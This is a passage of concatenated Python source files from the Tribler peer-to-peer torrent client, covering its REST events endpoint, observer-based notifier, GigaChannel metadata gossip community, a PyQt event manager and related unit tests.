        self.session.add_observer(self.on_market_payment_sent, NTFY_MARKET_ON_PAYMENT_SENT, [NTFY_UPDATE])
        self.session.add_observer(self.on_resource_event, SIGNAL_RESOURCE_CHECK, [SIGNAL_LOW_SPACE])
        self.session.add_observer(self.on_credit_minig_error, NTFY_CREDIT_MINING, [NTFY_ERROR])
        self.session.add_observer(self.on_shutdown, NTFY_TRIBLER, [STATE_SHUTDOWN])
        self.session.add_observer(self.on_circuit_removed, NTFY_TUNNEL, [NTFY_REMOVE])

    def write_data(self, message):
        """
        Write data over the event socket if it's open.
        """
        try:
            message_str = json.dumps(message)
        except UnicodeDecodeError:
            # The message contains invalid characters; fix them
            message_str = json.dumps(fix_unicode_dict(message))

        if len(self.events_requests) == 0:
            return
        else:
            [request.write(message_str + '\n') for request in self.events_requests]

    def on_upgrader_started(self, subject, changetype, objectID, *args):
        self.write_data({"type": "upgrader_started"})

    def on_upgrader_finished(self, subject, changetype, objectID, *args):
        self.write_data({"type": "upgrader_finished"})

    def on_upgrader_tick(self, subject, changetype, objectID, *args):
        self.write_data({"type": "upgrader_tick", "event": {"text": args[0]}})

    def on_watch_folder_corrupt_torrent(self, subject, changetype, objectID, *args):
        self.write_data({"type": "watch_folder_corrupt_torrent", "event": {"name": args[0]}})

    def on_new_version_available(self, subject, changetype, objectID, *args):
        self.write_data({"type": "new_version_available", "event": {"version": args[0]}})

    def on_tribler_started(self, subject, changetype, objectID, *args):
        self.write_data({"type": "tribler_started"})

    def on_channel_discovered(self, subject, changetype, objectID, *args):
        self.write_data({"type": "channel_discovered", "event": args[0]})

    def on_torrent_discovered(self, subject, changetype, objectID, *args):
        self.write_data({"type": "torrent_discovered", "event": args[0]})

    def on_torrent_finished(self, subject, changetype, objectID, *args):
        self.write_data({"type": "torrent_finished", "event": {"infohash": hexlify(objectID), "name": args[0]}})

    def on_torrent_error(self, subject, changetype, objectID, *args):
        self.write_data({"type": "torrent_error", "event": {"infohash": hexlify(objectID), "error": args[0]}})

    def on_torrent_info_updated(self, subject, changetype, objectID, *args):
        self.write_data({"type": "torrent_info_updated", "event": dict(infohash=hexlify(objectID), **args[0])})

    def on_tribler_exception(self, exception_text):
        self.write_data({"type": "tribler_exception", "event": {"text": exception_text}})

    def on_market_ask(self, subject, changetype, objectID, *args):
        self.write_data({"type": "market_ask", "event": args[0]})

    def on_market_bid(self, subject, changetype, objectID, *args):
        self.write_data({"type": "market_bid", "event": args[0]})

    def on_market_ask_timeout(self, subject, changetype, objectID, *args):
        self.write_data({"type": "market_ask_timeout", "event": args[0]})

    def on_market_bid_timeout(self, subject, changetype, objectID, *args):
        self.write_data({"type": "market_bid_timeout", "event": args[0]})

    def on_market_transaction_complete(self, subject, changetype, objectID, *args):
        self.write_data({"type": "market_transaction_complete", "event": args[0]})

    def on_market_payment_received(self, subject, changetype, objectID, *args):
        self.write_data({"type": "market_payment_received", "event": args[0]})

    def on_market_payment_sent(self, subject, changetype, objectID, *args):
        self.write_data({"type": "market_payment_sent", "event": args[0]})

    def on_resource_event(self, subject, changetype, objectID, *args):
        self.write_data({"type": changetype, "event": args[0]})

    def on_credit_minig_error(self, subject, changetype, ojbectID, *args):
        self.write_data({"type": "credit_mining_error", "event": args[0]})

    def on_shutdown(self, subject, changetype, objectID, *args):
        self.write_data({"type": "shutdown", "event": args[0]})

    def on_circuit_removed(self, subject, changetype, circuit, *args):
        if isinstance(circuit, Circuit):
            event = {
                "circuit_id": circuit.circuit_id,
                "bytes_up": circuit.bytes_up,
                "bytes_down": circuit.bytes_down,
                "uptime": time.time() - circuit.creation_time
            }
            self.write_data({"type": "circuit_removed", "event": event})

    def render_GET(self, request):
        """
        .. http:get:: /events

        A GET request to this endpoint will open the event connection.

            **Example request**:

                .. sourcecode:: none

                    curl -X GET http://localhost:8085/events
        """

        def on_request_finished(_):
            self.events_requests.remove(request)

        self.events_requests.append(request)
        request.notifyFinish().addCallbacks(on_request_finished, on_request_finished)

        request.write(json.dumps({"type": "events_start", "event": {
            "tribler_started": self.session.lm.initComplete, "version": version_id}}) + '\n')

        return server.NOT_DONE_YET

"""
Notifier.

Author(s): Jelle Roozenburg
"""
import logging
import threading

from Tribler.Core.simpledefs import (NTFY_TORRENTS, NTFY_PLAYLISTS, NTFY_COMMENTS,                    
                                     NTFY_MODIFICATIONS, NTFY_MODERATIONS, NTFY_MARKINGS, NTFY_MYPREFERENCES,                    
                                     NTFY_ACTIVITIES, NTFY_REACHABLE, NTFY_CHANNELCAST, NTFY_VOTECAST, NTFY_DISPERSY,                    
                                     NTFY_TRACKERINFO, NTFY_UPDATE, NTFY_INSERT, NTFY_DELETE, NTFY_TUNNEL,                    
                                     NTFY_STARTUP_TICK, NTFY_CLOSE_TICK, NTFY_UPGRADER,                    
                                     SIGNAL_ALLCHANNEL_COMMUNITY, SIGNAL_SEARCH_COMMUNITY, SIGNAL_TORRENT,                    
                                     SIGNAL_CHANNEL, SIGNAL_CHANNEL_COMMUNITY, SIGNAL_RSS_FEED,                    
                                     NTFY_WATCH_FOLDER_CORRUPT_TORRENT, NTFY_NEW_VERSION, NTFY_TRIBLER,                    
                                     NTFY_UPGRADER_TICK, NTFY_TORRENT, NTFY_CHANNEL, NTFY_MARKET_ON_ASK,                    
                                     NTFY_MARKET_ON_BID, NTFY_MARKET_ON_TRANSACTION_COMPLETE,                    
                                     NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID_TIMEOUT,                    
                                     NTFY_MARKET_IOM_INPUT_REQUIRED, NTFY_MARKET_ON_PAYMENT_RECEIVED,                    
                                     NTFY_MARKET_ON_PAYMENT_SENT, SIGNAL_RESOURCE_CHECK, NTFY_CREDIT_MINING,                    
                                     STATE_SHUTDOWN)                    


class Notifier(object):

    SUBJECTS = [NTFY_TORRENTS, NTFY_PLAYLISTS, NTFY_COMMENTS, NTFY_MODIFICATIONS, NTFY_MODERATIONS, NTFY_MARKINGS,
                NTFY_MYPREFERENCES, NTFY_ACTIVITIES, NTFY_REACHABLE, NTFY_CHANNELCAST, NTFY_CLOSE_TICK, NTFY_DISPERSY,
                NTFY_STARTUP_TICK, NTFY_TRACKERINFO, NTFY_TUNNEL, NTFY_UPGRADER, NTFY_VOTECAST,
                SIGNAL_ALLCHANNEL_COMMUNITY, SIGNAL_CHANNEL, SIGNAL_CHANNEL_COMMUNITY, SIGNAL_RSS_FEED,                    
                SIGNAL_SEARCH_COMMUNITY, SIGNAL_TORRENT, NTFY_WATCH_FOLDER_CORRUPT_TORRENT, NTFY_NEW_VERSION,
                NTFY_TRIBLER, NTFY_UPGRADER_TICK, NTFY_TORRENT, NTFY_CHANNEL, NTFY_MARKET_ON_ASK, NTFY_MARKET_ON_BID,                    
                NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID_TIMEOUT, NTFY_MARKET_ON_TRANSACTION_COMPLETE,                    
                NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_MARKET_ON_PAYMENT_SENT, NTFY_MARKET_IOM_INPUT_REQUIRED,
                SIGNAL_RESOURCE_CHECK, NTFY_CREDIT_MINING, STATE_SHUTDOWN]                    

    def __init__(self):
        self._logger = logging.getLogger(self.__class__.__name__)

        self.observers = []
        self.observerscache = {}
        self.observertimers = {}
        self.observerLock = threading.Lock()

    def add_observer(self, func, subject, changeTypes=None, id=None, cache=0):
        changeTypes = changeTypes or [NTFY_UPDATE, NTFY_INSERT, NTFY_DELETE]
        """
        Add observer function which will be called upon certain event
        Example:
        addObserver(NTFY_TORRENTS, [NTFY_INSERT,NTFY_DELETE]) -> get callbacks
                    when peers are added or deleted
        addObserver(NTFY_TORRENTS, [NTFY_SEARCH_RESULT], 'a_search_id') -> get
                    callbacks when peer-searchresults of of search
                    with id=='a_search_id' come in
        """
        assert isinstance(changeTypes, list)
        assert subject in self.SUBJECTS, 'Subject %s not in SUBJECTS' % subject

        obs = (func, subject, changeTypes, id, cache)
        self.observerLock.acquire()
        self.observers.append(obs)
        self.observerLock.release()

    def remove_observer(self, func):
        """ Remove all observers with function func
        """
        with self.observerLock:
            i = 0
            while i < len(self.observers):
                ofunc = self.observers[i][0]
                if ofunc == func:
                    del self.observers[i]
                else:
                    i += 1

    def remove_observers(self):
        with self.observerLock:
            for timer in self.observertimers.values():
                timer.cancel()
            self.observerscache = {}
            self.observertimers = {}
            self.observers = []

    def notify(self, subject, changeType, obj_id, *args):
        """
        Notify all interested observers about an event with threads from the pool
        """
        tasks = []
        assert subject in self.SUBJECTS, 'Subject %s not in SUBJECTS' % subject

        args = [subject, changeType, obj_id] + list(args)

        self.observerLock.acquire()
        for ofunc, osubject, ochangeTypes, oid, cache in self.observers:
            try:
                if (subject == osubject and
                    changeType in ochangeTypes and
                        (oid is None or oid == obj_id)):

                    if not cache:
                        tasks.append(ofunc)
                    else:
                        if ofunc not in self.observerscache:
                            def doQueue(ofunc):
                                self.observerLock.acquire()
                                if ofunc in self.observerscache:
                                    events = self.observerscache[ofunc]
                                    del self.observerscache[ofunc]
                                    del self.observertimers[ofunc]
                                else:
                                    events = []
                                self.observerLock.release()

                                if events:
                                    ofunc(events)

                            t = threading.Timer(cache, doQueue, (ofunc,))
                            t.setName("Notifier-timer-%s" % subject)
                            t.start()

                            self.observerscache[ofunc] = []
                            self.observertimers[ofunc] = t

                        self.observerscache[ofunc].append(args)
            except:
                self._logger.exception("OIDs were %s %s", repr(oid), repr(obj_id))

        self.observerLock.release()
        for task in tasks:
            task(*args)  # call observer function in this thread

from __future__ import absolute_import

import os

from pony.orm import db_session

from six.moves import xrange

from twisted.internet.defer import inlineCallbacks

from Tribler.Core.Modules.MetadataStore.OrmBindings.channel_node import NEW
from Tribler.Core.Modules.MetadataStore.store import MetadataStore
from Tribler.Core.Utilities.random_utils import random_infohash
from Tribler.community.gigachannel.community import GigaChannelCommunity
from Tribler.pyipv8.ipv8.keyvault.crypto import default_eccrypto
from Tribler.pyipv8.ipv8.peer import Peer
from Tribler.pyipv8.ipv8.test.base import TestBase


class TestGigaChannelUnits(TestBase):
    """
    Unit tests for the GigaChannel community which do not need a real Session.
    """

    def setUp(self):
        super(TestGigaChannelUnits, self).setUp()
        self.count = 0
        self.initialize(GigaChannelCommunity, 2)

    def create_node(self, *args, **kwargs):
        metadata_store = MetadataStore(os.path.join(self.temporary_directory(), "%d.db" % self.count),
                                       self.temporary_directory(), default_eccrypto.generate_key(u"curve25519"))
        kwargs['metadata_store'] = metadata_store
        node = super(TestGigaChannelUnits, self).create_node(*args, **kwargs)
        self.count += 1
        return node

    def add_random_torrent(self, metadata_cls):
        torrent_metadata = metadata_cls.from_dict({
            "infohash": random_infohash(),
            "title": "test",                    
            "tags": "",
            "size": 1234,
            "status": NEW
        })
        torrent_metadata.sign()

    @inlineCallbacks
    def test_send_random_one_channel(self):
        """
        Test whether sending a single channel with a single torrent to another peer works correctly
        """
        with db_session:
            channel = self.nodes[0].overlay.metadata_store.ChannelMetadata.create_channel("test", "bla")
            self.add_random_torrent(self.nodes[0].overlay.metadata_store.TorrentMetadata)
            channel.commit_channel_torrent()

        self.nodes[0].overlay.send_random_to(Peer(self.nodes[1].my_peer.public_key, self.nodes[1].endpoint.wan_address))

        yield self.deliver_messages()

        with db_session:
            self.assertEqual(len(self.nodes[1].overlay.metadata_store.ChannelMetadata.select()), 1)
            channel = self.nodes[1].overlay.metadata_store.ChannelMetadata.select()[:][0]
            self.assertEqual(channel.contents_len, 1)

    @inlineCallbacks
    def test_send_random_multiple_torrents(self):
        """
        Test whether sending a single channel with a multiple torrents to another peer works correctly
        """
        with db_session:
            channel = self.nodes[0].overlay.metadata_store.ChannelMetadata.create_channel("test", "bla")
            for _ in xrange(20):
                self.add_random_torrent(self.nodes[0].overlay.metadata_store.TorrentMetadata)
            channel.commit_channel_torrent()

        self.nodes[0].overlay.send_random_to(Peer(self.nodes[1].my_peer.public_key, self.nodes[1].endpoint.wan_address))

        yield self.deliver_messages()

        with db_session:
            self.assertEqual(len(self.nodes[1].overlay.metadata_store.ChannelMetadata.select()), 1)
            channel = self.nodes[1].overlay.metadata_store.ChannelMetadata.select()[:][0]
            self.assertLess(channel.contents_len, 20)

    @inlineCallbacks
    def test_send_and_get_channel_update_back(self):
        """
        Test if sending back information on updated version of a channel works
        """
        with db_session:
            # Add channel to node 0
            channel = self.nodes[0].overlay.metadata_store.ChannelMetadata.create_channel("test", "bla")
            for _ in xrange(20):
                self.add_random_torrent(self.nodes[0].overlay.metadata_store.TorrentMetadata)
            channel.commit_channel_torrent()
            channel_v1_dict = channel.to_dict()
            channel_v1_dict.pop("health")
            self.add_random_torrent(self.nodes[0].overlay.metadata_store.TorrentMetadata)
            channel.commit_channel_torrent()

            # Add the outdated version of the channel to node 1
            self.nodes[1].overlay.metadata_store.ChannelMetadata.from_dict(channel_v1_dict)

        # node1 --outdated_channel--> node0
        self.nodes[1].overlay.send_random_to(Peer(self.nodes[0].my_peer.public_key, self.nodes[0].endpoint.wan_address))

        yield self.deliver_messages(0.5)

        with db_session:
            self.assertEqual(self.nodes[1].overlay.metadata_store.ChannelMetadata.select()[:][0].timestamp,
                             self.nodes[0].overlay.metadata_store.ChannelMetadata.select()[:][0].timestamp)

from __future__ import absolute_import

import logging

from twisted.internet import reactor
from twisted.internet.defer import Deferred, inlineCallbacks
from twisted.internet.protocol import Protocol
from twisted.internet.task import deferLater
from twisted.web.client import Agent, HTTPConnectionPool
from twisted.web.http_headers import Headers

import Tribler.Core.Utilities.json_util as json
from Tribler.Core.simpledefs import NTFY_CHANNEL, NTFY_CREDIT_MINING, NTFY_DISCOVERED, NTFY_ERROR, NTFY_FINISHED,\                    
    NTFY_INSERT, NTFY_MARKET_ON_ASK, NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID, NTFY_MARKET_ON_BID_TIMEOUT,\                    
    NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_MARKET_ON_PAYMENT_SENT, NTFY_MARKET_ON_TRANSACTION_COMPLETE,\                    
    NTFY_NEW_VERSION, NTFY_REMOVE, NTFY_STARTED, NTFY_TORRENT, NTFY_TUNNEL, NTFY_UPDATE, NTFY_UPGRADER,\                    
    NTFY_UPGRADER_TICK, NTFY_WATCH_FOLDER_CORRUPT_TORRENT, SIGNAL_LOW_SPACE, SIGNAL_RESOURCE_CHECK                    
from Tribler.Core.version import version_id
from Tribler.Test.Core.Modules.RestApi.base_api_test import AbstractApiTest
from Tribler.Test.tools import trial_timeout
from Tribler.pyipv8.ipv8.messaging.anonymization.tunnel import Circuit


class EventDataProtocol(Protocol):
    """
    This class is responsible for reading the data received over the event socket.
    """

    def __init__(self, messages_to_wait_for, finished, response):
        self.json_buffer = []
        self._logger = logging.getLogger(self.__class__.__name__)
        self.messages_to_wait_for = messages_to_wait_for + 1  # The first event message is always events_start
        self.finished = finished
        self.response = response

    def dataReceived(self, data):
        self._logger.info("Received data: %s" % data)
        self.json_buffer.append(json.loads(data))
        self.messages_to_wait_for -= 1
        if self.messages_to_wait_for == 0:
            self.response.loseConnection()

    def connectionLost(self, reason="done"):
        self.finished.callback(self.json_buffer[1:])


class TestEventsEndpoint(AbstractApiTest):

    @inlineCallbacks
    def setUp(self):
        yield super(TestEventsEndpoint, self).setUp()
        self.events_deferred = Deferred()
        self.connection_pool = HTTPConnectionPool(reactor, False)
        self.socket_open_deferred = self.tribler_started_deferred.addCallback(self.open_events_socket)
        self.messages_to_wait_for = 0

    @inlineCallbacks
    def tearDown(self):
        yield self.close_connections()

        # Wait to make sure the HTTPChannel is closed, see https://twistedmatrix.com/trac/ticket/2447
        yield deferLater(reactor, 0.3, lambda: None)

        yield super(TestEventsEndpoint, self).tearDown()

    def on_event_socket_opened(self, response):
        response.deliverBody(EventDataProtocol(self.messages_to_wait_for, self.events_deferred, response))

    def open_events_socket(self, _):
        agent = Agent(reactor, pool=self.connection_pool)
        return agent.request('GET', 'http://localhost:%s/events' % self.session.config.get_http_api_port(),
                             Headers({'User-Agent': ['Tribler ' + version_id]}), None) \
            .addCallback(self.on_event_socket_opened)

    def close_connections(self):
        return self.connection_pool.closeCachedConnections()

    @trial_timeout(20)
    def test_events(self):
        """
        Testing whether various events are coming through the events endpoints
        """
        self.messages_to_wait_for = 20                    

        def send_notifications(_):
            self.session.notifier.notify(NTFY_UPGRADER, NTFY_STARTED, None, None)
            self.session.notifier.notify(NTFY_UPGRADER_TICK, NTFY_STARTED, None, None)
            self.session.notifier.notify(NTFY_UPGRADER, NTFY_FINISHED, None, None)
            self.session.notifier.notify(NTFY_WATCH_FOLDER_CORRUPT_TORRENT, NTFY_INSERT, None, None)
            self.session.notifier.notify(NTFY_NEW_VERSION, NTFY_INSERT, None, None)
            self.session.notifier.notify(NTFY_CHANNEL, NTFY_DISCOVERED, None, None)
            self.session.notifier.notify(NTFY_TORRENT, NTFY_DISCOVERED, None, {'a': 'Invalid character \xa1'})
            self.session.notifier.notify(NTFY_TORRENT, NTFY_FINISHED, 'a' * 10, None)
            self.session.notifier.notify(NTFY_TORRENT, NTFY_ERROR, 'a' * 10, 'This is an error message')
            self.session.notifier.notify(NTFY_MARKET_ON_ASK, NTFY_UPDATE, None, {'a': 'b'})
            self.session.notifier.notify(NTFY_MARKET_ON_BID, NTFY_UPDATE, None, {'a': 'b'})
            self.session.notifier.notify(NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_UPDATE, None, {'a': 'b'})
            self.session.notifier.notify(NTFY_MARKET_ON_BID_TIMEOUT, NTFY_UPDATE, None, {'a': 'b'})
            self.session.notifier.notify(NTFY_MARKET_ON_TRANSACTION_COMPLETE, NTFY_UPDATE, None, {'a': 'b'})
            self.session.notifier.notify(NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_UPDATE, None, {'a': 'b'})
            self.session.notifier.notify(NTFY_MARKET_ON_PAYMENT_SENT, NTFY_UPDATE, None, {'a': 'b'})
            self.session.notifier.notify(SIGNAL_RESOURCE_CHECK, SIGNAL_LOW_SPACE, None, {})
            self.session.notifier.notify(NTFY_CREDIT_MINING, NTFY_ERROR, None, {"message": "Some credit mining error"})
            self.session.notifier.notify(NTFY_TUNNEL, NTFY_REMOVE, Circuit(1234, None), 'test')
            self.session.lm.api_manager.root_endpoint.events_endpoint.on_tribler_exception("hi")

        self.socket_open_deferred.addCallback(send_notifications)

        return self.events_deferred

from __future__ import absolute_import

from twisted.internet import reactor
from twisted.internet.defer import inlineCallbacks, maybeDeferred
from twisted.web.server import Site
from twisted.web.util import Redirect

from Tribler.Core.Utilities.network_utils import get_random_port
from Tribler.Core.Utilities.utilities import http_get, is_valid_url, parse_magnetlink                    
from Tribler.Test.test_as_server import AbstractServer
from Tribler.Test.tools import trial_timeout


class TestMakeTorrent(AbstractServer):

    def __init__(self, *argv, **kwargs):
        super(TestMakeTorrent, self).__init__(*argv, **kwargs)
        self.http_server = None

    def setUpHttpRedirectServer(self, port, redirect_url):
        self.http_server = reactor.listenTCP(port, Site(Redirect(redirect_url)))

    @inlineCallbacks
    def tearDown(self):
        if self.http_server:
            yield maybeDeferred(self.http_server.stopListening)
        yield super(TestMakeTorrent, self).tearDown()

    def test_parse_magnetlink_lowercase(self):
        """
        Test if a lowercase magnet link can be parsed
        """
        _, hashed, _ = parse_magnetlink('magnet:?xt=urn:btih:apctqfwnowubxzoidazgaj2ba6fs6juc')

        self.assertEqual(hashed, "\x03\xc58\x16\xcdu\xa8\x1b\xe5\xc8\x182`'A\x07\x8b/&\x82")

    def test_parse_magnetlink_uppercase(self):
        """
        Test if a lowercase magnet link can be parsed
        """
        _, hashed, _ = parse_magnetlink('magnet:?xt=urn:btih:APCTQFWNOWUBXZOIDAZGAJ2BA6FS6JUC')

        self.assertEqual(hashed, "\x03\xc58\x16\xcdu\xa8\x1b\xe5\xc8\x182`'A\x07\x8b/&\x82")

    def test_valid_url(self):
        """ Test if the URL is valid """
        test_url = "http://anno nce.torrentsmd.com:8080/announce"
        self.assertFalse(is_valid_url(test_url), "%s is not a valid URL" % test_url)

        test_url2 = "http://announce.torrentsmd.com:8080/announce "
        self.assertTrue(is_valid_url(test_url2), "%s is a valid URL" % test_url2)

        test_url3 = "http://localhost:1920/announce"
        self.assertTrue(is_valid_url(test_url3))

        test_url4 = "udp://localhost:1264"
        self.assertTrue(is_valid_url(test_url4))

    @trial_timeout(5)
    def test_http_get_with_redirect(self):
        """
        Test if http_get is working properly if url redirects to a magnet link.
        """

        def on_callback(response):
            self.assertEqual(response, magnet_link)

        # Setup a redirect server which redirects to a magnet link
        magnet_link = "magnet:?xt=urn:btih:DC4B96CF85A85CEEDB8ADC4B96CF85A85CEEDB8A"
        port = get_random_port()

        self.setUpHttpRedirectServer(port, magnet_link)

        test_url = "http://localhost:%d" % port
        http_deferred = http_get(test_url).addCallback(on_callback)

        return http_deferred

from __future__ import absolute_import

from binascii import unhexlify

from pony.orm import CacheIndexError, TransactionIntegrityError, db_session

from Tribler.Core.Modules.MetadataStore.OrmBindings.channel_metadata import entries_to_chunk
from Tribler.Core.Modules.MetadataStore.serialization import CHANNEL_TORRENT                    
from Tribler.Core.Modules.MetadataStore.store import GOT_NEWER_VERSION
from Tribler.pyipv8.ipv8.community import Community
from Tribler.pyipv8.ipv8.lazy_community import lazy_wrapper
from Tribler.pyipv8.ipv8.messaging.lazy_payload import VariablePayload
from Tribler.pyipv8.ipv8.peer import Peer

minimal_blob_size = 200
maximum_payload_size = 1024
max_entries = maximum_payload_size // minimal_blob_size


class RawBlobPayload(VariablePayload):
    format_list = ['raw']
    names = ['raw_blob']


class GigaChannelCommunity(Community):
    """
    Community to gossip around gigachannels.
    """

    master_peer = Peer(unhexlify("3081a7301006072a8648ce3d020106052b8104002703819200040448a078b597b62d3761a061872cd86"                    
                                 "10f58cb513f1dc21e66dd59f1e01d582f633b182d9ca6e5859a9a34e61eb77b768e5e9202f642fd50c6"
                                 "0b89d8d8b0bdc355cdf8caac262f6707c80da00b1bcbe7bf91ed5015e5163a76a2b2e630afac96925f5"
                                 "daa8556605043c6da4db7d26113cba9f9cbe63fddf74625117598317e05cb5b8cbd606d0911683570ad"
                                 "bb921c91"))

    NEWS_PUSH_MESSAGE = 1

    def __init__(self, my_peer, endpoint, network, metadata_store):                    
        super(GigaChannelCommunity, self).__init__(my_peer, endpoint, network)
        self.metadata_store = metadata_store
        self.add_message_handler(self.NEWS_PUSH_MESSAGE, self.on_blob)

    def send_random_to(self, peer):
        """
        Send random entries from our subscribed channels to another peer.

        :param peer: the peer to send to
        :type peer: Peer
        :returns: None
        """
        # Choose some random entries and try to pack them into maximum_payload_size bytes
        md_list = []
        with db_session:
            # TODO: when the health table will be there, send popular torrents instead
            channel_l = list(self.metadata_store.ChannelMetadata.get_random_channels(1, only_subscribed=True))
            if not channel_l:
                return
            md_list.extend(channel_l + list(channel_l[0].get_random_torrents(max_entries - 1)))
            blob = entries_to_chunk(md_list, maximum_payload_size)[0] if md_list else None
        self.endpoint.send(peer.address, self.ezr_pack(self.NEWS_PUSH_MESSAGE, RawBlobPayload(blob)))

    @lazy_wrapper(RawBlobPayload)
    def on_blob(self, peer, blob):
        """
        Callback for when a MetadataBlob message comes in.

        :param peer: the peer that sent us the blob
        :param blob: payload raw data
        """
        try:
            with db_session:
                try:
                    md_list = self.metadata_store.process_compressed_mdblob(blob.raw_blob)
                except (TransactionIntegrityError, CacheIndexError) as err:
                    self._logger.error("DB transaction error when tried to process payload: %s", str(err))
                    return
        # Unfortunately, we have to catch the exception twice, because Pony can raise them both on the exit from
        # db_session, and on calling the line of code
        except (TransactionIntegrityError, CacheIndexError) as err:
            self._logger.error("DB transaction error when tried to process payload: %s", str(err))
            return

        # Check if the guy who send us this metadata actually has an older version of this md than
        # we do, and queue to send it back.
        with db_session:
            reply_list = [md for md, result in md_list if
                          (md and (md.metadata_type == CHANNEL_TORRENT)) and (result == GOT_NEWER_VERSION)]
            reply_blob = entries_to_chunk(reply_list, maximum_payload_size)[0] if reply_list else None
        if reply_blob:
            self.endpoint.send(peer.address, self.ezr_pack(self.NEWS_PUSH_MESSAGE, RawBlobPayload(reply_blob)))


class GigaChannelTestnetCommunity(GigaChannelCommunity):
    """
    This community defines a testnet for the giga channels, used for testing purposes.
    """
    master_peer = Peer(unhexlify("3081a7301006072a8648ce3d020106052b81040027038192000401b9f303778e7727b35a4c26487481f"                    
                                 "a7011e252cc4a6f885f3756bd8898c9620cf1c32e79dd5e75ae277a56702a47428ce47676d005e262fa"
                                 "fd1a131a2cb66be744d52cb1e0fca503658cb3368e9ebe232e7b8c01e3172ebfdb0620b316467e5b2c4"
                                 "c6809565cf2142e8d4322f66a3d13a8c4bb18059c9ed97975a97716a085a93e3e62b0387e63f0bf389a"
                                 "0e9bffe6"))

from __future__ import absolute_import

import logging
import time

from PyQt5.QtCore import QTimer, QUrl, pyqtSignal
from PyQt5.QtNetwork import QNetworkAccessManager, QNetworkReply, QNetworkRequest

import Tribler.Core.Utilities.json_util as json

received_events = []


class EventRequestManager(QNetworkAccessManager):
    """
    The EventRequestManager class handles the events connection over which important events in Tribler are pushed.
    """

    torrent_info_updated = pyqtSignal(object)
    received_search_result_channel = pyqtSignal(object)                    
    received_search_result_torrent = pyqtSignal(object)                    
    tribler_started = pyqtSignal()
    upgrader_tick = pyqtSignal(str)
    upgrader_started = pyqtSignal()
    upgrader_finished = pyqtSignal()
    new_version_available = pyqtSignal(str)
    discovered_channel = pyqtSignal(object)
    discovered_torrent = pyqtSignal(object)
    torrent_finished = pyqtSignal(object)
    received_market_ask = pyqtSignal(object)
    received_market_bid = pyqtSignal(object)
    expired_market_ask = pyqtSignal(object)
    expired_market_bid = pyqtSignal(object)
    market_transaction_complete = pyqtSignal(object)
    market_payment_received = pyqtSignal(object)
    market_payment_sent = pyqtSignal(object)
    market_iom_input_required = pyqtSignal(object)
    events_started = pyqtSignal(object)
    low_storage_signal = pyqtSignal(object)
    credit_mining_signal = pyqtSignal(object)
    tribler_shutdown_signal = pyqtSignal(str)

    def __init__(self, api_port):
        QNetworkAccessManager.__init__(self)
        url = QUrl("http://localhost:%d/events" % api_port)
        self.request = QNetworkRequest(url)
        self.failed_attempts = 0
        self.connect_timer = QTimer()
        self.current_event_string = ""
        self.tribler_version = "Unknown"
        self.reply = None
        self.emitted_tribler_started = False  # We should only emit tribler_started once
        self.shutting_down = False
        self._logger = logging.getLogger('TriblerGUI')

    def on_error(self, error, reschedule_on_err):
        self._logger.info("Got Tribler core error: %s" % error)
        if error == QNetworkReply.ConnectionRefusedError:
            if self.failed_attempts == 40:
                raise RuntimeError("Could not connect with the Tribler Core within 20 seconds")

            self.failed_attempts += 1

            if reschedule_on_err:
                # Reschedule an attempt
                self.connect_timer = QTimer()
                self.connect_timer.setSingleShot(True)
                self.connect_timer.timeout.connect(self.connect)
                self.connect_timer.start(500)

    def on_read_data(self):
        if self.receivers(self.finished) == 0:
            self.finished.connect(lambda reply: self.on_finished())
        self.connect_timer.stop()
        data = self.reply.readAll()
        self.current_event_string += data
        if len(self.current_event_string) > 0 and self.current_event_string[-1] == '\n':
            for event in self.current_event_string.split('\n'):
                if len(event) == 0:
                    continue
                json_dict = json.loads(str(event))

                received_events.insert(0, (json_dict, time.time()))
                if len(received_events) > 100:  # Only buffer the last 100 events
                    received_events.pop()

                if json_dict["type"] == "torrent_info_updated":
                    self.torrent_info_updated.emit(json_dict["event"])
                elif json_dict["type"] == "tribler_started" and not self.emitted_tribler_started:
                    self.tribler_started.emit()
                    self.emitted_tribler_started = True
                elif json_dict["type"] == "new_version_available":
                    self.new_version_available.emit(json_dict["event"]["version"])
                elif json_dict["type"] == "upgrader_started":
                    self.upgrader_started.emit()
                elif json_dict["type"] == "upgrader_finished":
                    self.upgrader_finished.emit()
                elif json_dict["type"] == "upgrader_tick":
                    self.upgrader_tick.emit(json_dict["event"]["text"])
                elif json_dict["type"] == "channel_discovered":
                    self.discovered_channel.emit(json_dict["event"])
                elif json_dict["type"] == "torrent_discovered":
                    self.discovered_torrent.emit(json_dict["event"])
                elif json_dict["type"] == "events_start":
                    self.events_started.emit(json_dict["event"])
                    self.tribler_version = json_dict["event"]["version"]
                    if json_dict["event"]["tribler_started"] and not self.emitted_tribler_started:
                        self.tribler_started.emit()
                        self.emitted_tribler_started = True
                elif json_dict["type"] == "torrent_finished":
                    self.torrent_finished.emit(json_dict["event"])
                elif json_dict["type"] == "market_ask":
                    self.received_market_ask.emit(json_dict["event"])
                elif json_dict["type"] == "market_bid":
                    self.received_market_bid.emit(json_dict["event"])
                elif json_dict["type"] == "market_ask_timeout":
                    self.expired_market_ask.emit(json_dict["event"])
                elif json_dict["type"] == "market_bid_timeout":
                    self.expired_market_bid.emit(json_dict["event"])
                elif json_dict["type"] == "market_transaction_complete":
                    self.market_transaction_complete.emit(json_dict["event"])
                elif json_dict["type"] == "market_payment_received":
                    self.market_payment_received.emit(json_dict["event"])
                elif json_dict["type"] == "market_payment_sent":
                    self.market_payment_sent.emit(json_dict["event"])
                elif json_dict["type"] == "market_iom_input_required":
                    self.market_iom_input_required.emit(json_dict["event"])
                elif json_dict["type"] == "signal_low_space":
                    self.low_storage_signal.emit(json_dict["event"])
                elif json_dict["type"] == "credit_mining_error":
                    self.credit_mining_signal.emit(json_dict["event"])
                elif json_dict["type"] == "shutdown":
                    self.tribler_shutdown_signal.emit(json_dict["event"])
                elif json_dict["type"] == "tribler_exception":
                    raise RuntimeError(json_dict["event"]["text"])
            self.current_event_string = ""

    def on_finished(self):
        """
        Somehow, the events connection dropped. Try to reconnect.
        """
        if self.shutting_down:
            return
        self._logger.warning("Events connection dropped, attempting to reconnect")
        self.failed_attempts = 0

        self.connect_timer = QTimer()
        self.connect_timer.setSingleShot(True)
